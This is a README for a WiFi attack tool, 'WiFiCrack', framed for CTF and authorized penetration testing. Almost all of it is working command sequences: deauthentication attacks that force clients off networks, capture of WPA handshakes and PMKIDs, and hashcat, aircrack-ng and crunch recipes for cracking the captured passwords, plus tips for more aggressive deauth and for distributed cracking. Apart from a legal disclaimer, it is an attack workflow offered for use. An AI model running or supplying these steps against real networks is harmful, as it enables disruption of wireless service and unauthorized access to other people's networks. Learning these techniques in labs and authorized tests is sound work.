# WiFiCrack - Modern WiFi Security Auditing Tool

A comprehensive Linux tool for WiFi security auditing, EAPOL handshake capture, and WPA/WPA2/WPA3 password cracking. Designed for CTF challenges and authorized penetration testing.

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED USE ONLY**

This tool is designed for:
- CTF (Capture The Flag) competitions
- Authorized penetration testing engagements
- Security research with proper authorization
- Educational purposes in controlled environments
- Testing security of your own networks

**Unauthorized access to computer networks is illegal.** Use this tool responsibly and only on networks you own or have explicit written permission to test.

## 🚀 Features

### Core Capabilities
- **EAPOL Handshake Capture**: Capture WPA/WPA2 4-way handshakes
- **PMKID Attacks**: Clientless attacks on modern routers
- **Multiple Cracking Modes**:
  - Dictionary attacks
  - Brute force attacks
  - Hybrid attacks
  - Rule-based mutations
- **Multi-threaded Processing**: Utilize all CPU cores
- **Modern Hash Support**: WPA3, hashcat 22000/22001 formats
- **Tool Integration**: Works with hashcat, aircrack-ng, hcxtools

### Advanced Features
- Automatic monitor mode management
- Network scanning and BSSID discovery
- Deauthentication attacks to force handshakes
- Wordlist generation with common patterns
- Progress tracking and performance metrics
- Multiple output formats (cap, pcap, 22000)

## 📦 Installation

### Quick Install (Recommended)

```bash
chmod +x install-wificrack.sh
./install-wificrack.sh
```

This will install:
- aircrack-ng suite (airodump, aireplay, aircrack)
- hashcat (GPU-accelerated cracking)
- hcxtools (modern hash conversion)
- hcxdumptool (PMKID capture)
- Additional wireless tools
- Python dependencies

### Manual Installation

```bash
# Core tools
sudo apt update
sudo apt install aircrack-ng hashcat hcxtools hcxdumptool

# Additional tools
sudo apt install wireless-tools iw net-tools

# Python dependencies
pip3 install --user scapy

# Make executable
chmod +x wificrack.py
```

### Verify Installation

```bash
aircrack-ng --help
hashcat --version
hcxpcapngtool --version
```

## 📖 Usage Guide

### 1. Network Scanning

Find available WiFi networks:

```bash
sudo ./wificrack.py capture -i wlan0 --scan
```

This will display:
- ESSID (network name)
- BSSID (MAC address)
- Channel
- Signal strength

### 2. Capture EAPOL Handshake

#### Interactive Mode (Recommended for CTF)

```bash
sudo ./wificrack.py capture -i wlan0 --scan
# Select network from list
```

#### Manual Mode

```bash
sudo ./wificrack.py capture -i wlan0 -b 00:11:22:33:44:55 -c 6 -o captured
```

Parameters:
- `-i`: Network interface (e.g., wlan0)
- `-b`: Target BSSID (router MAC address)
- `-c`: WiFi channel
- `-o`: Output file prefix
- `-t`: Timeout in seconds (default: 60)

**What happens:**
1. Enables monitor mode on your interface
2. Starts capturing on the specified channel
3. Sends deauth packets to force clients to reconnect
4. Captures the 4-way handshake
5. Converts to multiple formats (.cap, .22000)

### 3. Password Cracking

#### Using Hashcat (Fastest - GPU Accelerated)

```bash
# Modern format (recommended)
./wificrack.py crack -f handshake.22000 -w wordlists/rockyou.txt --hashcat

# With custom hashcat options
hashcat -m 22000 handshake.22000 wordlists/rockyou.txt --force -O
```

#### Using Aircrack-ng (CPU-based)

```bash
./wificrack.py crack -f handshake-01.cap -w wordlists/rockyou.txt --aircrack

# Or directly
aircrack-ng handshake-01.cap -w wordlists/rockyou.txt
```

### 4. Wordlist Generation

Generate custom wordlists with common patterns:

```bash
# Basic generation
./wificrack.py wordlist -o my-wordlist.txt

# With custom patterns
./wificrack.py wordlist -o custom.txt -p CompanyName WifiName Router
```

**Generated mutations include:**
- Base patterns
- Numbers (0-999)
- Common suffixes (!, @, 123, 2024, 2025)
- Leetspeak (a→4, e→3, i→1, o→0)
- Combinations

## 🎯 CTF Challenge Strategies

### Strategy 1: Quick Dictionary Attack

```bash
# 1. Capture handshake
sudo ./wificrack.py capture -i wlan0 --scan

# 2. Try common passwords first
./wificrack.py wordlist -o quick.txt -p password admin welcome
./wificrack.py crack -f handshake.22000 -w quick.txt --hashcat

# 3. If failed, use rockyou
hashcat -m 22000 handshake.22000 wordlists/rockyou.txt --force
```

### Strategy 2: PMKID Attack (No Clients Needed)

```bash
# 1. Capture PMKID (clientless - works even if no devices connected)
sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=1

# 2. Convert to hashcat format
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# 3. Crack
hashcat -m 22000 pmkid.22000 wordlists/rockyou.txt
```

**PMKID advantages:**
- No client deauthentication needed
- Faster capture (no waiting for handshake)
- Works on many modern routers
- Ideal for CTF challenges

### Strategy 3: Targeted Brute Force

For CTF challenges with hints about password format:

```bash
# Known pattern: "wifi" + 4 digits
crunch 8 8 -t wifi@@@@ -o wifi-pins.txt
hashcat -m 22000 handshake.22000 wifi-pins.txt

# Known pattern: lowercase + 2 digits
crunch 8 8 -t @@@@@@%% -o lowercase-nums.txt
hashcat -m 22000 handshake.22000 lowercase-nums.txt
```

### Strategy 4: Rule-Based Attack

Use hashcat rules for mutations:

```bash
# With best64 rule
hashcat -m 22000 handshake.22000 wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# With dive rule (more aggressive)
hashcat -m 22000 handshake.22000 wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
```

## 🛠️ Advanced Techniques

### Multi-Interface Capture

If you have multiple wireless adapters:

```bash
# Terminal 1: Capture on interface 1
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap1 wlan0mon

# Terminal 2: Deauth on interface 2
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan1mon
```

### Hash Format Conversion

```bash
# CAP to HCCAPX (legacy hashcat)
cap2hccapx handshake.cap handshake.hccapx

# CAP to 22000 (modern hashcat)
hcxpcapngtool -o handshake.22000 handshake.cap

# PCAPNG to 22000
hcxpcapngtool -o handshake.22000 capture.pcapng
```

### WPA3 Considerations

WPA3 uses SAE (Simultaneous Authentication of Equals):

```bash
# Capture WPA3 handshake
sudo hcxdumptool -i wlan0 -o wpa3.pcapng --enable_status=15

# Convert (will extract both WPA2 and WPA3 hashes if available)
hcxpcapngtool -o wpa3.22000 wpa3.pcapng

# Crack WPA3 (hashcat mode 22000)
hashcat -m 22000 wpa3.22000 wordlists/rockyou.txt
```

## 📊 Performance Optimization

### Hashcat Optimization

```bash
# Show available devices
hashcat -I

# Use specific GPU
hashcat -m 22000 -d 1 handshake.22000 wordlist.txt

# Workload tuning (1=low, 2=default, 3=high, 4=nightmare)
hashcat -m 22000 -w 3 handshake.22000 wordlist.txt

# Optimized kernel
hashcat -m 22000 -O handshake.22000 wordlist.txt
```

### Multi-threaded Aircrack

```bash
# Use all CPU cores
aircrack-ng -w wordlist.txt handshake.cap -p $(nproc)
```

### Distributed Cracking

Split wordlist across multiple machines:

```bash
# Machine 1
hashcat -m 22000 -s 0 -l 50000000 handshake.22000 rockyou.txt

# Machine 2
hashcat -m 22000 -s 50000000 -l 50000000 handshake.22000 rockyou.txt
```

## 🔍 Troubleshooting

### Issue: Monitor Mode Failed

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Manually enable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Issue: No Handshake Captured

**Possible causes:**
1. No clients connected to target AP
2. Wrong channel
3. Weak signal
4. Deauth not working

**Solutions:**
```bash
# Increase capture time
sudo ./wificrack.py capture -i wlan0 -b <BSSID> -c <CH> -t 300

# More aggressive deauth
sudo aireplay-ng -0 0 -a <BSSID> wlan0mon

# Try PMKID instead
sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=1
```

### Issue: Hashcat Not Using GPU

```bash
# Check GPU detection
hashcat -I

# Install OpenCL/CUDA drivers
# For NVIDIA:
sudo apt install nvidia-opencl-dev

# For AMD:
sudo apt install mesa-opencl-icd
```

### Issue: Invalid Handshake

Verify handshake quality:

```bash
# With aircrack-ng
aircrack-ng handshake.cap
# Look for "1 handshake" message

# With hcxpcapngtool
hcxpcapngtool handshake.cap
# Should show EAPOL records
```

## 📚 Wordlist Resources

### Recommended Wordlists

1. **RockYou** (134MB, 14M passwords)
   ```bash
   wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
   ```

2. **SecLists WiFi**
   ```bash
   git clone https://github.com/danielmiessler/SecLists.git
   # Use: SecLists/Passwords/WiFi-WPA/
   ```

3. **CrackStation**
   ```bash
   wget https://crackstation.net/files/crackstation.txt.gz
   gunzip crackstation.txt.gz
   ```

4. **Custom CTF Wordlist**
   ```bash
   # Generate based on CTF theme/hints
   ./wificrack.py wordlist -o ctf.txt -p CTF2025 Challenge Flag Admin
   ```

### Creating Targeted Wordlists

```bash
# Based on ESSID
./wificrack.py wordlist -o custom.txt -p "NetworkName"

# Using crunch for patterns
crunch 8 12 -t @@@@%%%% -o alphanumeric.txt  # 4 letters + 4 numbers
crunch 10 10 -t router@@@@ -o router-pins.txt  # "router" + 4 digits

# Using John the Ripper rules
john --wordlist=base.txt --rules --stdout > mutated.txt
```

## 🎓 Understanding WPA/WPA2 Handshake

### The 4-Way Handshake

```
Client (STA)                    Access Point (AP)
     |                                |
     |  (1) ANonce                    |
     |<-------------------------------|
     |                                |
     |  (2) SNonce + MIC              |
     |------------------------------->|
     |                                |
     |  (3) GTK + MIC                 |
     |<-------------------------------|
     |                                |
     |  (4) ACK                       |
     |------------------------------->|
```

**What we need to crack:**
- ESSID (network name)
- AP MAC address
- Client MAC address
- ANonce (from AP)
- SNonce (from client)
- MIC (Message Integrity Code)
- EAPOL frame data

### PMKID Attack Theory

PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)

**Advantages:**
- Only requires RSN IE frame
- No client needed
- No deauthentication
- Faster capture

## 🔐 Hash Modes Reference

| Mode | Type | Format |
|------|------|--------|
| 2500 | WPA/WPA2 | .hccapx (legacy) |
| 22000 | WPA/WPA2 PMKID/EAPOL | .22000 (modern) |
| 22001 | WPA/WPA2 PMKID | .22000 |

Use mode **22000** for all modern captures.

## 🚦 CTF Workflow Summary

```bash
# Step 1: Install
./install-wificrack.sh

# Step 2: Scan
sudo ./wificrack.py capture -i wlan0 --scan

# Step 3: Capture (choose one method)
# Method A: Traditional handshake
sudo ./wificrack.py capture -i wlan0 -b <BSSID> -c <CH>

# Method B: PMKID (faster)
sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Step 4: Quick crack attempt
./wificrack.py wordlist -o quick.txt
hashcat -m 22000 handshake.22000 quick.txt

# Step 5: Full crack
hashcat -m 22000 handshake.22000 rockyou.txt --force

# Step 6: If still not cracked, try rules
hashcat -m 22000 handshake.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## 📞 Getting Help

- Check `--help` for any command
- Read error messages carefully
- Verify handshake quality before cracking
- Check signal strength (closer to AP = better)
- Monitor mode must be enabled

## 🎯 Pro Tips

1. **Always try PMKID first** - much faster than waiting for handshakes
2. **Use targeted wordlists** - if you have hints about the password format
3. **GPU > CPU** - hashcat with GPU is 100x faster than aircrack-ng
4. **Signal matters** - get close to the AP for reliable captures
5. **Verify before cracking** - check handshake is valid before running expensive cracks
6. **Start small** - try common passwords before rockyou
7. **Use rules** - hashcat rules can find mutations of dictionary words
8. **Multiple captures** - if one handshake fails, capture another
9. **Check EAPOL count** - more EAPOL frames = better chance of valid handshake
10. **Save everything** - keep all capture files for later analysis

## 📄 File Extensions

- `.cap` - Legacy capture format (aircrack-ng)
- `.pcap` / `.pcapng` - Standard packet capture format
- `.hccapx` - Legacy hashcat format (pre-v6)
- `.22000` - Modern hashcat format (WPA/WPA2/WPA3)
- `.txt` - Wordlist format

## 🏆 Example CTF Solution

```bash
# Scenario: CTF WiFi challenge with password hint "admin + year"

# 1. Capture
sudo hcxdumptool -i wlan0 -o ctf.pcapng --enable_status=1

# 2. Convert
hcxpcapngtool -o ctf.22000 ctf.pcapng

# 3. Create targeted wordlist based on hint
./wificrack.py wordlist -o ctf-wordlist.txt -p admin Admin ADMIN

# Also generate year variations
for year in {2020..2025}; do
    echo "admin$year" >> ctf-wordlist.txt
    echo "Admin$year" >> ctf-wordlist.txt
    echo "ADMIN$year" >> ctf-wordlist.txt
done

# 4. Crack
hashcat -m 22000 ctf.22000 ctf-wordlist.txt --force

# Result: Password found - "Admin2024"
```

## ⚡ Quick Reference

| Task | Command |
|------|---------|
| Scan networks | `sudo ./wificrack.py capture -i wlan0 --scan` |
| Capture handshake | `sudo ./wificrack.py capture -i wlan0 -b <BSSID> -c <CH>` |
| Capture PMKID | `sudo hcxdumptool -i wlan0 -o out.pcapng` |
| Convert to hashcat | `hcxpcapngtool -o out.22000 in.cap` |
| Crack with hashcat | `hashcat -m 22000 hash.22000 wordlist.txt` |
| Crack with aircrack | `aircrack-ng -w wordlist.txt capture.cap` |
| Generate wordlist | `./wificrack.py wordlist -o out.txt -p base1 base2` |

---

**Happy hacking! (legally!)** 🎯

Remember: Always get proper authorization before testing any network you don't own.
